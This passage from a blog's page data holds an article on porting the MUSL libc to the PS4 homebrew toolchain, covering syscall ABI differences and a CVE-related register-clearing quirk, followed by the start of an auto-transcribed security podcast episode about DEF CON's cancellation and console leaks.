This is not an easy task, building homebrew that will run on the system without official tools presents many challenges. Key among these challenges were:</p>\n<ul>\n<li>The executables use a customized ELF format that enables functionality unique to the console.</li>\n<li>The libc library used by Sony does not adhere to standards other libc libraries adhere to.</li>\n<li>We cannot redistribute sony libraries with the toolchain for legal reasons.</li>\n</ul>\n<p>While tackling the custom ELF format was an interesting task that I may go into in the future, the process of porting <a href=\"https://musl.libc.org/\">MUSL</a> also offered interesting hurdles and lessons.</p>\n<h2 id=\"overviewoflibc\">Overview of libc</h2>\n<p>Many developers treat libc as a black-box, they don't care how libc works, they just care that it does. This is perfectly fine when targeting an established platform that has a mature libc already working on it. When porting to a new platform however, you need to go into the nitty gritty details, because libc essentially acts as the glue between userland and kernel. For example, you will very rarely see userland applications issue system calls directly, but this is common-place in the world of libc. So if we break libc down, what are the fundamental components that are provided by libc to applications?</p>\n<ol>\n<li>The C Runtime (CRT) stub for initializing the environment, typically known as <code>crt1.o</code>.</li>\n<li>A layer to abstract common functionality (ie. file I/O, networking, data types, memory management) away from the platform's low-level interface (system calls, sysctls/ioctls, etc).</li>\n<li>Type definitions and objects for things like stdin, stdout, stderr, and error handling (errno).</li>\n</ol>\n<p>These components must be tailored to the operating system and architecture being targeted.</p>\n<h2 id=\"comparingbsdlibcandmusl\">Comparing BSD libc and MUSL</h2>\n<p>For those not familiar with PS4 internals, it's a FreeBSD based system, based on FreeBSD 9.0. Sony added their own system calls and modified some existing kernel code while also running a custom userland, but most of the standard syscalls are still pretty similar. Given it's a BSD system at base, one might ask; why not use BSD libc instead of MUSL - after all, it should match what the system exposes more closely? Knowing this, I decided to give it a shot. Here are some of my observations of both BSD libc and MUSL.</p>\n<p><strong>BSD libc</strong></p>\n<ol>\n<li>It was assumed BSD libc would work out of the box with minor CRT stub changes. It built without issue, but at runtime, this didn't end up being the case. Even something as simple as <code>sprintf()</code> failed with EINVAL, which is pretty incredible considering that's not even listed as a possible return value in the MAN pages. Bummer.</li>\n<li>It requires a BSD system to build it, and you build it by building &quot;BSD world&quot;, which is massive and includes more than just libc. Navigating the codebase was far more difficult, and the code was less easy to work with.</li>\n<li>Because of how much of a behemoth BSD world is, the build times were extremely long.</li>\n</ol>\n<p><strong>MUSL</strong></p>\n<ol>\n<li>MUSL definitely wouldn't work out of the box without some significant changes, as it's a Linux-based libc and we're dealing with BSD. Even getting it to build required changes.</li>\n<li>Unlike BSD world, MUSL is just a libc (and a minimal one at that). Fixing things was relatively easy and the code was readable and easily understood even if you're not familiar with the codebase.</li>\n<li>MUSL build times were blazingly fast compared to BSD libc. Where BSD libc would take about 20 minutes to build, building MUSL took closer to 2 minutes.</li>\n</ol>\n<p>Even though in theory porting MUSL would take more changes than building a modified BSD libc, MUSL was the better option when we considered how much easier it was to work with and how much faster it was to build.</p>\n<h2 id=\"acustomcrtstub\">A custom CRT stub</h2>\n<p>Most of the time, in C programs, <code>main()</code> is not the true entry-point. While it's the entry-point as far as the application author is concerned, the real endpoint is usually <code>_start()</code> unless changed in the compiler flags or by a pre-processor directive. The reason for this is the C runtime wants to initialize it's environment before running any user-code. This is handled by the CRT stub. The bulk of the C runtime bootstrapping code is contained in the <code>crt1.o</code> object file. Generally in this file, you have the entry-point <code>_start()</code>, which calls <code>__libc_start_main()</code>, passing the address of the user-defined <code>main()</code> which <code>__libc_start-main()</code> will execute after it finishes initializing environment-related stuff.</p>\n<p>The PS4 is a little different in this regard, because the PS4 doesn't have a conventional environment or set of arguments provided to it. As a matter of fact, the PS4 doesn't even want applications to ever return, as attempting to return from main() will crash the game. This makes sense, as games do not need or use arguments, and games should never return unless the player quits the game or application. With this in mind, I ignored <code>__libc_start_main()</code> and defined my own <code>_start()</code> which matches closer to the one produced by BSD libc.</p>\n<pre><code class=\"language-c\">__asm__(\n&quot;.intel_syntax noprefix \\n&quot;\n&quot;.global &quot; START &quot; \\n&quot;\nSTART &quot;: \\n&quot;\n\t&quot;sub rsp, 0x28 \\n&quot;\n\t&quot;mov rdi, r8 \\n&quot;\n\t&quot;call atexit \\n&quot;\n\t&quot;xor edx, edx \\n&quot;\n\t&quot;mov edi, r9d \\n&quot;\n\t&quot;mov rsi, r10 \\n&quot;\n\t&quot;call main \\n&quot;\n\t&quot;mov r11d, eax \\n&quot;\n\t&quot;mov edi, r11d \\n&quot;\n\t&quot;call exit \\n&quot;\n);\n</code></pre>\n<p>The other significant change that had to be made was the PS4 has a customized ELF loader. The dynamic linking is custom, and there are additional non-standard / Sony-defined segments linked into PS4 apps. While most of these other segments are out of scope for this article, one of these segments is <code>.sce_process_param</code>. This segment defines metadata information, and needs to be linked into every application. Because of this, the CRT stub is a good location to put this segment in, as it'll always get linked with every application built with the toolchain.</p>\n<p>Some of this metadata information includes the version magic for &quot;ORBIS&quot; applications, entries for other specialized objects, the SDK version used to build the app, and other various information. Below is a snippet of this custom section; I won't paste the full thing for brevity's sake, but if you're interested, you can check this out by going to the port repo and looking at <code>/arch/ps4/crt_arch.h</code>.</p>\n<pre><code class=\"language-c\">__asm__(\n&quot;.intel_syntax noprefix \\n&quot;\n&quot;.align 0x8 \\n&quot;\n&quot;.section \\&quot;.data.sce_process_param\\&quot; \\n&quot;\n&quot;_sceProcessParam: \\n&quot;\n\t// size\n\t&quot;.quad \t0x50 \\n&quot;\n\t// magic &quot;ORBI&quot;\n\t&quot;.long   0x4942524F \\n&quot;\n\t// entry count\n\t&quot;.long \t0x3 \\n&quot;\n\t// ...\n);\n</code></pre>\n<h2 id=\"usingbsdsyscalls\">Using BSD Syscalls</h2>\n<p>As MUSL is a Linux-based libc, it's going to invoke Linux syscalls to bridge the gap between userland and kernel. Linux and FreeBSD have different sets of syscalls. While there are a lot of similarities (for example <code>open()</code>, <code>read()</code>, <code>write()</code>, <code>close()</code>), differences start to appear when you hit less common system calls. Luckily MUSL was written with this in mind, and provides the handy ability for custom &quot;architectures&quot; (more like targets) to be defined, which allows you to specify (among various other things), a set of input syscall identifiers.</p>\n<p>To define syscall numbers, MUSL reads the <code>/bits/syscall.h.in</code> file from the architecture directory.</p>\n<pre><code class=\"language-c\">#define\t__NR_syscall\t0\n#define\t__NR_exit\t1\n#define\t__NR_fork\t2\n// ...\n</code></pre>\n<p>The differences in syscalls between Linux and FreeBSD vary depending on the subsystem. For some (such as file I/O), the differences are little to none. For others, the difference is merely a different name or a few arguments switched around. In some cases though, the syscall straight up doesn't exist in BSD where it does in Linux. This is the case for things like fast user-space mutexes (or &quot;futexes&quot; for short). While porting to the PS4, I encountered all of these types of differences.</p>\n<p>In the case of different names, I just made alias definitions for the names MUSL expects and defined them to the BSD syscall that does the same thing. A good example of this is the set of syscalls used for signaling.</p>\n<pre><code class=\"language-c\">// Aliases for linux -&gt; BSD\n#define __NR_rt_sigqueueinfo    __NR_sigqueue\n#define __NR_rt_sigaction       __NR_sigaction\n#define __NR_rt_sigpending      __NR_sigpending\n// ...\n</code></pre>\n<p>In the harder to resolve cases like the system call not existing, it was always in exotic functionality, so I ifdef'd out calls to syscalls we didn't have. In the future, any functionality that needs implementing can be added in. The ifdef'ing was done to prevent breaking MUSL for non-PS4 architectures. This is illustrated by the <code>fanotify_init()</code> syscall, which does not exist on FreeBSD.</p>\n<pre><code class=\"language-c\">int fanotify_init(unsigned flags, unsigned event_f_flags)\n{\n#ifndef PS4\n\treturn syscall(SYS_fanotify_init, flags, event_f_flags);\n#else\n\treturn -1;\n#endif\n}\n</code></pre>\n<p>These are all the changes necessary to get MUSL to <em>build</em>, but you'll run into bugs at runtime. This is because of discrepancies between the kernel ABI of Linux and BSD.</p>\n<h2 id=\"kernelabidifferences\">Kernel ABI differences</h2>\n<p>The Application Binary Interface, or &quot;ABI&quot;, is basically a specification that outlines the calling convention to be followed, binary formats, dynamic linking, and other things. The calling convention is what's most important, because we need to know what registers are preserved, what registers are trashed and are volatile (aka. &quot;scratch&quot;) registers, and which registers are used for arguments and return values. Userland and kernel have slightly different calling conventions.</p>\n<p>Linux and BSD both use the &quot;System V&quot; or &quot;SYSV&quot; ABI specification. We're going to focus on the calling convention for the purposes of this article. Under SYSV, the following specifications apply:</p>\n<p><strong>Userland</strong></p>\n<p>For function calls:</p>\n<ul>\n<li>Registers <code>RBX</code>,  <code>RSP</code>, <code>RBP</code>, <code>R12</code>,  <code>R13</code>,  <code>R14</code>, and <code>R15</code> are preserved, meaning their values are saved by callee functions.</li>\n<li>Registers <code>RAX</code>, <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, <code>R9</code>, <code>R10</code>, and <code>R11</code> are volatile / scratch registers, meaning their values are <em>not</em> saved by callee functions.</li>\n<li>For passing arguments and returning values, the following applies:\n<ul>\n<li>In order of 1st arg to 6th arg, registers <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, and <code>R9</code> are used respectively. Beyond this, arguments are passed on the stack.</li>\n<li>The return value is stored in <code>RAX</code>.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Kernel</strong></p>\n<p>For system calls:</p>\n<ul>\n<li>Registers <code>RBX</code>, <code>RSP</code>, <code>RBP</code>, <code>R12</code>, <code>R13</code>, <code>R14</code>, and <code>R15</code> are preserved.</li>\n<li>For passing arguments, the following applies:\n<ul>\n<li>The <code>RAX</code> register is used to specify what system call index to invoke from the system call table.</li>\n<li>In order of 1st arg to 6th arg, registers <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>R10</code>, <code>R8</code>, and <code>R9</code> are used respectively.</li>\n<li>The first (and usually only) return value is stored in <code>RAX</code>.</li>\n<li>The second return value if it exists, is stored in <code>RBX</code>.</li>\n</ul>\n</li>\n<li>Register <code>RCX</code> is trashed by the kernel syscall exception handler to store the original instruction pointer value before the syscall.</li>\n<li><em>Usually</em>, while the argument registers are volatile in userland context, their values are saved and restored after a syscall by the syscall exception handler itself.</li>\n</ul>\n<h2 id=\"bug1whenbsdps4gaslightsyou\">Bug #1: When BSD/PS4 gaslights you</h2>\n<p>Notice in the last section I said <em>usually</em> the argument register values are saved and restored after a syscall with emphasis on &quot;usually&quot;. In Linux this is the case, and on FreeBSD this used to be the case. On the PS4 and on newer FreeBSD versions after January of 2019, this assumption is broken.</p>\n<p>From a system design point of view, you have to be careful with registers when switching privilege levels to and from kernel. You need to ensure you restore registers to their original values or otherwise change them before returning back to userland, ideally the former. For one, you don't want to &quot;bait and switch&quot; the register values out from underneath your userland caller if you can help it. Sometimes an argument register might be used to store data that's re-used later after the syscall returns, especially considering the argument registers are scratch registers, which are considered fair game by the compiler.</p>\n<p>The second and probably more important reason from a security point of view is you don't want to leak kernel register values to userland. Information disclosures like this can be powerful for exploitation, it can single handedly destroy kernel ASLR. It seems this was a concern, but rather than restoring the registers to their userland values pre-syscall, they instead opted to <strong>clear</strong> the register values by XOR'ing the registers with themselves before returning to userland. This galaxy brain idea causes issues! I only discovered this issue with the <code>R10</code> register, but I figured it's probably happening to more than just <code>R10</code>, so I checked out the <code>Xfast_syscall</code> exception handler for system calls in a PS4 kernel dump.</p>\n<pre><code class=\"language-nasm\">mov     rdi, qword [rsp]\nmov     rsi, qword [rsp+0x8]\nmov     rdx, qword [rsp+0x10]\nmov     rax, qword [rsp+0x30]\nmov     r11, qword [rsp+0xb8]\nmov     rcx, qword [rsp+0xa8]\nmov     rsp, qword [rsp+0xc0]\nxor     r8, r8  {0x0}\nxor     r9, r9  {0x0}\nxor     r10, r10  {0x0}\nswapgs  \nsysret  \n</code></pre>\n<p>Not only does it clear <code>R10</code>, it clears <code>R8</code> and <code>R9</code> as well. What's even more interesting is this code was added by Sony, as this code is not present in FreeBSD 9. But this code does exist in FreeBSD 12. If we look at the git blame for BSD's <code>/sys/amd64/amd64/exception.S</code> which contains exception handler implementations, we'll notice the following commit:</p>\n<p><a href=\"https://github.com/freebsd/freebsd/commit/84203fed6bace55a9e7f89d83cf74bd81603e91e\">https://github.com/freebsd/freebsd/commit/84203fed6bace55a9e7f89d83cf74bd81603e91e</a></p>\n<blockquote>\n<p>amd64: clear callee-preserved registers on syscall exit.</p>\n<p>%r8, %r10, and on non-KPTI configuration %r9 were not restored on fast<br>\nreturn from a syscall.</p>\n<p>Reviewed by:\tmarkj<br>\nApproved by:\tso<br>\nSecurity:\tCVE-2019-5595<br>\nSponsored by:\tThe FreeBSD Foundation<br>\nMFC after:\t0 minutes</p>\n</blockquote>\n<p>If we check out CVE-2019-5595:</p>\n<blockquote>\n<p>In FreeBSD before 11.2-STABLE(r343782), 11.2-RELEASE-p9,  12.0-STABLE(r343781), and 12.0-RELEASE-p3, kernel callee-save registers are not properly sanitized before return from system calls, potentially allowing some kernel data used in the system call to be exposed.</p>\n</blockquote>\n<p>As suspected. There was kernel information disclosure via the scratch registers. But instead of restoring them properly to userland-saved values, they just zero them out. I have no idea how this does not break assumptions when building BSD's libc, they must have some special code that's aware of it that I couldn't find. It's either that or there <em>were</em> bugs created by this issue that are yet undiscovered/disclosed.</p>\n<p>The odd thing here is the PS4 dump I looked at is 5.05 firmware, which was released in January of 2018. This commit in FreeBSD mainline however, was pushed in February of 2019. Sony knew about this problem before FreeBSD did by over a year. Either Sony reported this issue and it took a while to land in FreeBSD, or FreeBSD maintainers had to discover the issue independently later on. Due to the fix being very similar, I'd guess it's likely Sony had a hand in the mainline FreeBSD patch, as the fix is basically identical.</p>\n<p>This &quot;fix&quot; isn't optimal, because regular clang doesn't expect this behavior. Compilers like to be efficient, so it'll try to re-use registers where possible to avoid the performance cost of reloading a register. With this assumption broken, there are logic bugs introduced. Any time the compiler re-uses <code>R8</code>, <code>R9</code>, or <code>R10</code> after invoking a syscall, it will trigger undefined behavior. In the case of pointers, this causes null pointer dereferences in code that from the source level looks perfectly valid. This issue was discovered thanks to these null pointer dereferences.</p>\n<p>For example, <code>printf()</code> in MUSL calls a function called <code>__stdout_write</code>, which issues a <code>TIOCGWINSZ</code> ioctl syscall to get the window size. Here's the disassembly:</p>\n<p><img src=\"https://i.imgur.com/prfyUu8.png\" alt=\"\"></p>\n<p>This code looks OK until you consider <code>syscall</code> clobbers <code>R10</code>. Boom, null pointer dereference on the <code>mov dword [r10+0x90], -1</code> instruction. To workaround this, I modified the syscall wrappers to backup and restore these registers.</p>\n<pre><code class=\"language-c\">static __inline long __syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)\n{\n\t// ...\n    \n\t__asm__ __volatile__\n\t(\n\t\t&quot;.intel_syntax\\n\\t&quot;\n        &quot;push r8\\n\\t&quot;\n        &quot;push r9\\n\\t&quot;\n\t\t&quot;push r10\\n\\t&quot;\n\t\t&quot;syscall\\n\\t&quot;\n\t\t// ...\n        &quot;pop r10\\n\\t&quot;\n        &quot;pop r9\\n\\t&quot;\n        &quot;pop r8\\n\\t&quot; : &quot;=a&quot;(ret) :\n                       &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2), &quot;d&quot;(a3),\n                           &quot;r&quot;(r10), &quot;r&quot;(r8), &quot;r&quot;(r9) :\n                       &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;\n\t);\n    \n    return ret;\n}\n</code></pre>\n<h2 id=\"bug2syscallerrorhandling\">Bug #2: Syscall error handling</h2>\n<p>This bug was more my fault than anything, as I didn't realize SYSV did not extend beyond just defining the registers involved with error handling. It does <em>not</em> define how syscalls should indicate an error occurred and whether or not to return positive or negative errno values. In Linux, system calls on success return 0 or the positive value of whatever they should return (commonly a descriptor or a count). In cases of failure, a negative errno is returned. Expecting this, MUSL has a handler which checks if the return is <code>-4095 &lt;= RAX &lt;= -1</code>. If it's within this range, it sets errno appropriately by flipping the errno back to a positive by negating it, and returns -1.</p>\n<pre><code class=\"language-c\">long __syscall_ret(unsigned long r)\n{\n\tif (r &gt; -4096UL) {\n\t\terrno = -r;\n\t\treturn -1;\n\t}\n\treturn r;\n}\n</code></pre>\n<p>FreeBSD is a little different though. FreeBSD system calls return a positive errno, not a negative one. One may wonder how this works; how would you know the syscall had failed and the return value should be interpreted as an error rather than interpreted as valid data? It just so happens FreeBSD sets the carry flag or &quot;CF&quot; of <code>FLAGS</code> to 1 on error, and 0 on success.</p>\n<blockquote>\n<p>When using the standard FreeBSD calling convention, the <code>carry flag</code> is cleared upon success, set upon failure.</p>\n</blockquote>\n<p>It took me a bit of time to figure out how to do this in a way that didn't feel like a hack. I ended up doing a conditional jump based on the carry flag, and negated <code>RAX</code> if the flag was set. These changes were again added to the syscall wrappers.</p>\n<pre><code class=\"language-c\">static __inline long __syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)\n{\n\t// ...\n    \n\t__asm__ __volatile__\n\t(\n\t\t&quot;.intel_syntax\\n\\t&quot;\n    \t// ...\n\t\t&quot;syscall\\n\\t&quot;\n\t\t&quot;jnc syscallexit%=\\n\\t&quot;\n\t\t&quot;neg rax\\n\\t&quot;\n\t\t&quot;syscallexit%=:\\n\\t&quot;\n\t\t// ...\n    \t: &quot;=a&quot;(ret) : &quot;=a&quot;(ret) :\n                      &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2), &quot;d&quot;(a3),\n                          &quot;r&quot;(r10), &quot;r&quot;(r8), &quot;r&quot;(r9) :\n                      &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;\n\t);\n</code></pre>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>There are a lot of low-level factors to consider when porting something like a libc, and it's easy to get frustrated and fall victim to subtle discrepancies. To test the MUSL port, I wrote a suite of unit tests some readers may find interesting, and compiled it with the OpenOrbis PS4 Toolchain against the newly-built MUSL libc static library. Below you can find a link to the MUSL PS4 port [1], the mentioned set of tests [2], the test results directly from the PS4 [3], and other references.</p>\n<p>[1] <a href=\"https://github.com/OpenOrbis/musl\">https://github.com/OpenOrbis/musl</a></p>\n<p>[2] <a href=\"https://github.com/OpenOrbis/OpenOrbis-PS4-Toolchain/tree/master/samples\">https://github.com/OpenOrbis/OpenOrbis-PS4-Toolchain/tree/master/samples</a></p>\n<p>[3] <a href=\"https://pastebin.com/Wzvbdk8s\">https://pastebin.com/Wzvbdk8s</a></p>\n<p>[4] <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-5595\">https://nvd.nist.gov/vuln/detail/CVE-2019-5595</a></p>\n<p>[5] <a href=\"https://www.freebsd.org/doc/en_US.ISO8859-1/books/developers-handbook/x86-return-values.html\">https://www.freebsd.org/doc/en_US.ISO8859-1/books/developers-handbook/x86-return-values.html</a></p>\n<!--kg-card-end: markdown-->","slug":"adventures-of-porting-musl-to-ps4"}},{"node":{"title":"Episode 41-  Defcon is canceled, Microsoft was hacked, Rust has vulns","path":"/posts/episode-41/","date":"12 May 2020","description":"It was a busy week, Microsofts Github account was hacked, Centurylink Routers have no security, and multiple interactionless RCEs in Samsung phones.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/S1Ol46vkzhQ\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Update: While we talk about Huawei Kernel Self Protection (HKSP) I make mention of the authors statement that he is unrelated to Huawei.

Welcome to episode 41 of the day Zero podcast. I'm Specter with me a zi and he's he's keeping me awake helping me fight off the darkness. Yeah.\", \"start\": 9.4}, {\"speaker\": 2, \"line\": \" Sounds like you've had a fun weekend.\", \"start\": 20.8}, {\"speaker\": 1, \"line\": \" Yeah, but a very long night. I don't I don't think I've slept in like 28 hours now so, you know, we're going on a streak. So before we jump into the news, we do want to bring up that we are going to be going on a summer break. We want to announce that early. We don't just want to spray it on you guys, so Our last episode is on the 25th of the month. Yep that matches up and then I believe we're going to be back on the 14th. I'm right on that right see on the date\", \"start\": 22.7}, {\"speaker\": 2, \"line\": \" of call Timber. Yeah, September 14th emblems the day we agreed\", \"start\": 49.9}, {\"speaker\": 1, \"line\": \" on. Yeah, so we'll be away for a few months just because we're going to be doing some stuff. I'm going to be going up north for a little bit and my connection up there isn't is not going to be very good. I can promise you that\", \"start\": 53.5}, {\"speaker\": 2, \"line\": \" and people probably don't want to just hear me ramble on. Alone for a while and I don't know. I mean we could do\", \"start\": 66.2}, {\"speaker\": 1, \"line\": \" a straw poll\", \"start\": 72.3}, {\"speaker\": 2, \"line\": \" now but I mean it's a did something similar last year. We talked I think a longer break last year though, but\", \"start\": 74.9}, {\"speaker\": 1, \"line\": \" not too much to do this year. So the shorter break this year. We'll get into that in a minute. I think so part of the reason that I was up so late or basically the only reason I haven't really been sleeping as because we've been On the open orbis PS4 toolchain, so I figured I'd do you know a little plug a little bit of you know, Shameless self-promotion. I guess it hasn't dropped yet, which is why I have a screenshot up on the screen. But the open orbis toolchain is going to be dropping later on today. We've been working on it for over a year. There's been a lot of reversing work and programming and stuff and there's been a collaboration between like lots of people to make it come\", \"start\": 85.3}, {\"speaker\": 2, \"line\": \" together. So I mean the or anybody that's not familiar with it. What's the purpose\", \"start\": 131.6}, {\"speaker\": 1, \"line\": \" here? To build PS4 applications games Homebrew because basically to build PS4 applications in the past. You've had to use the Sony SDK, which is obviously it's copyrighted material. It's leaked. You're not supposed to have it. It's technically illegal. So it's not really ideal. You know, people have to get pirated links for the tool chain or for the official SDK and then technically even anything they you know produce what that SDK could technically be be in like, you know legal grey water as well\", \"start\": 136.2}, {\"speaker\": 2, \"line\": \" on that note has do you know if anybody that's actually been\", \"start\": 169.8}, {\"speaker\": 1, \"line\": \" prosecuted or using it? No, actually, but\", \"start\": 172.5}, {\"speaker\": 2, \"line\": \" II mean that's not a reason not like that's not a reason to go and use it like oh nobody's been prosecute. Therefore. It's fine. You generally still want to stay out of using copyrighted material because if Sony were to decide to you don't want to give you an ice cream stand on. Yeah.\", \"start\": 180.2}, {\"speaker\": 1, \"line\": \" Yeah. I mean, it's kind of interesting. I almost feel like Sony is a little bit scared to do it now. I don't know if because they got a lot of PR backlash back in the PS3 days when they tried to sue Go hot. You know what I mean? That case kind of I think I don't know because they haven't really tried to pull anything like that since but you know, maybe that'll change. Who knows though. But yeah, basically it's an open source tool chain all the tools and headers and libraries and everything are completely like our code. There's no Sony has TK code or anything in there. We actually do kind of a cool trick because obviously the PS4 has, you know, its own libraries and we can't Distribute those libraries right? Because they're not ours and we actually do kind of a cool trick there where we make fake libraries and do re-linking after the fact to make it look like we're linking against Real Dynamic libraries, but we're not those kind of its kind of cool how it works. We do some like fun tricks like that to make it work. But yeah people will be able to see how that all works a little bit later on tonight. We wanted to try to get something done in Europe before it drops. That's why it's Mira drops like way early. This morning and this the tool chain is a little bit later. But yeah, we just want to try to get something done in Mira first, but the tool chain will be dropping tonight. So it might be, you know, interesting for some of you out there to check that out and especially if you're interested in consoles and home brew and stuff like that. You know figure we do a little bit of Shameless self promotion of the beginning the episode.\", \"start\": 194.8}, {\"speaker\": 2, \"line\": \" I don't think too much for now. That's fair. I mean, I'm sure a lot of people are here because they know if you threw your PS4 work so, you know, you're not dropping a kernel exploit, but it's something\", \"start\": 291.4}, {\"speaker\": 1, \"line\": \" nothing's ever good enough. All right, so we can move on to Def con so memes have are no longer dreams this year memes have crossed over into reality. As dark tangent has put it Defcon has been canceled. I mean we all knew this was gonna happen. There was no there was no chance that death comes going to happen this year. It's just too close. So I did want to ask see because there was something you linked to me during the week that I forgot to check out you were saying something about a Defcon Discord thing and I wanted to yeah,\", \"start\": 304.6}, {\"speaker\": 2, \"line\": \" well, so that's actually here on this page. They mentioned here then on August 6 will open the def con Discord dot IO / DC server off for everyone to join and start their work on experience So Def Con in person is canceled. They are going to try and do like more virtual. And so part of that is the is the Discord. But I do think that this court has an interesting idea. I don't know how that's going to turn out given the numbers that the def con will see that could end up being quite the large. Discord server and not really get much discussion out if it'd be just because there's too many people.\", \"start\": 340.9}, {\"speaker\": 1, \"line\": \" So are they using Discord because of that that like video chat kind of\", \"start\": 387.7}, {\"speaker\": 2, \"line\": \" feature. They don't mention that okay, so I have no idea if that's going to be related.\", \"start\": 392.7}, {\"speaker\": 1, \"line\": \" See I was just wondering because Discord seems like kind of an odd Choice especially for something like Defcon defcons always been kind of had that theme of like don't trust anything and discords one of those were I could see some people not wanting to use it just because there's been you know, Rumors forever about logging. I don't know how much I trust those rumors, but you know, there's been rumors about logging and then you obviously you have the rich present stuff which some people aren't super happy with I remember at one point. I don't know if it still does it it would forcefully show if you were on mobile or not at least on\", \"start\": 398.8}, {\"speaker\": 2, \"line\": \" iOS, I believe libros if you're only on\", \"start\": 435.0}, {\"speaker\": 1, \"line\": \" mobile Yeah,\", \"start\": 438.7}, {\"speaker\": 2, \"line\": \" so I mean in terms of long I don't think discords have really claim that they don't log. I mean they definitely don't push themselves as the Privacy Centric option. So yeah, it is a little bit strange for def con at the same time. You know, they're trying to reach kind of the masses like I mean Defcon is not just like a new hacker only convention. I mean most of the people are show up at def con. Are more enthusiastic than anything\", \"start\": 441.4}, {\"speaker\": 1, \"line\": \" else? Yeah, I just would have expected like IRC or telegram.\", \"start\": 471.2}, {\"speaker\": 2, \"line\": \" Well, so what I was going to say though, is that both of those kind of have their rough edges in terms of being used in general?\", \"start\": 475.6}, {\"speaker\": 1, \"line\": \" Yeah, their usability is a little bit harsh especially like IRC not many people use IRC anymore.\", \"start\": 484.4}, {\"speaker\": 2, \"line\": \" Yeah. So I mean Defcon is probably probably one of the best options they have it. I mean, I understand the concerns about privacy and all that at the same time given the type of person they're trying to appeal to a lot of them are already going to be using Discord in are going to share those same reservations. That's it. I can't imagine they're using it for the streaming because I think there's still a pretty significant limit. Even if you're even if you're like maxed out and it Discord partner. I still think there's a limit on how much it's like. Yeah. It's like it's still well they often will they up there, too? Well for free, I think they opted to like 50, but even so those I mean 50 people like defcons not going to use that to stream. Yeah, that's not enough people when we're talking about a thousand\", \"start\": 491.3}, {\"speaker\": 1, \"line\": \" people exactly. Yeah. So now there is one other last-minute thing that I saw actually before we started screaming because I had Twitter open in another tab. I remember episodes ago. We were talking about how Defcon Qualls were postponed because As they weren't sure what was going on with the covid situation stuff like that. Yeah and Order of\", \"start\": 544.1}, {\"speaker\": 2, \"line\": \" the Overflow has put out a bit of an update, but you can keep going.\", \"start\": 566.7}, {\"speaker\": 1, \"line\": \" Yeah, so I was going to say order the Overflow has announced there will be a Defcon CTF final because that was one thing we were kind of speculating about is if defcons canceled what's going to happen with the final at the CTF and it seems they are going to be going through with it. They don't know exactly what it's going to look like yet. They're kind of I think they're still trying to work out all the details, but they are going to try to make it work. So it's going to be virtual for sure because there's no other way you could do it.\", \"start\": 570.0}, {\"speaker\": 2, \"line\": \" But yeah, it'll be all right police say mentioned exactly that that it would be virtual.\", \"start\": 596.7}, {\"speaker\": 1, \"line\": \" Yeah. They said they're still trying to work out the details and it's cool to see like test the waters and see how well it works out. That means that I don't think it's going to be virtual ever again because it's kind of a once-in-a-lifetime thing and I think generally people want the finals to be local. Although I don't know because some of the people I talked to the Defcon CTF last year were saying or maybe make it easier before but they were saying like they really hated with the def con finals how it's in like a public area and they can't focus it all because there's so much noise\", \"start\": 601.6}, {\"speaker\": 2, \"line\": \" so I know at least in the past that has been more or less by Design. mmm Having that as part of our challenge. Yeah. Yeah, that's said I thought last year. They had kind of moved the CTF a little bit more out of the way from how it's normally been.\", \"start\": 632.9}, {\"speaker\": 1, \"line\": \" Yeah, that's that's why I was saying two years ago because last year, you're right. I think they had it in Paris or whatever and it was basically that was the only thing in that hotel basically was the CTF and maybe a few other like really small like things. So yeah last year it was The year before though I remember hearing some people that they were like and Folks at all on the CTF floor. Yeah, that's neither here. And I feel like I don't\", \"start\": 652.5}, {\"speaker\": 2, \"line\": \" know something organizers. Like I feel like Dede Tech mentioned something about that basically being like intentional least for theirs and they were the organizers before legit Pious who did it or before order of the\", \"start\": 679.3}, {\"speaker\": 1, \"line\": \" Overflow. So how many more years is order the Overflow have defcons like a contract with def con? Do you know\", \"start\": 694.0}, {\"speaker\": 2, \"line\": \" I don't recall how many years I remember when they put out the call for organizers and it had I want to say it had three years on it. But I reckon you're\", \"start\": 701.6}, {\"speaker\": 1, \"line\": \" right. Their second or third third,\", \"start\": 715.6}, {\"speaker\": 2, \"line\": \" I think so this this might be their last year or might not like I really don't remember. So yes, right. I don't want to come down I saying like it's definitely oh I mean, even if it was the end of their kind of contract I imagined I could still be extended regardless. Yeah, it's just kind of a minimum rather than maximum. Yeah,\", \"start\": 719.6}, {\"speaker\": 1, \"line\": \" overall though. It'll be interesting to see how it goes. Well, we'll keep an eye out for that. Who knows maybe we'll even do like a quick like update stream during our break just if there's something interesting that happens or something, you know,\", \"start\": 744.7}, {\"speaker\": 2, \"line\": \" what is worth mentioning also am in terms of our break there. Yeah, we're going to be going off for you know, the few months. We still May stream during that period we may or may not probably won't be the podcast but just in general streams. And don't say no schedules. Yeah, basically, yeah coming back onto the CTF though. I guess maybe I'm mistaken. I don't see any update actually from order of the Overflow. I could have sworn I had seen one, but\", \"start\": 756.2}, {\"speaker\": 1, \"line\": \" I'm not seeing what her page their Twitter page had an update put out today, I think\", \"start\": 783.2}, {\"speaker\": 2, \"line\": \" okay. I thought I saw something earlier though. Either way. It doesn't matter. I don't know where it is now, so might as well just be gone.\", \"start\": 788.8}, {\"speaker\": 1, \"line\": \" All right, so we'll move on. So this year has been the year of the leaks. We've had AMD source code leaks we've had csgo source code links. We've had Microsoft leaks and we've had a Nintendo leaks and some of the Nintendo leaks we've seen have been like debug ROMs and stuff like that. But the big thing is apparently the full source code and design specs were leaked for the Wii. And I will say like this stuff is pretty old like the we as pretty old by now, but I\", \"start\": 800.3}, {\"speaker\": 2, \"line\": \" think well, so I don't leave their stuff for the we also for like the GameCube, I believe the\", \"start\": 832.7}, {\"speaker\": 1, \"line\": \" N64 heard yes stuff as well. I think\", \"start\": 842.6}, 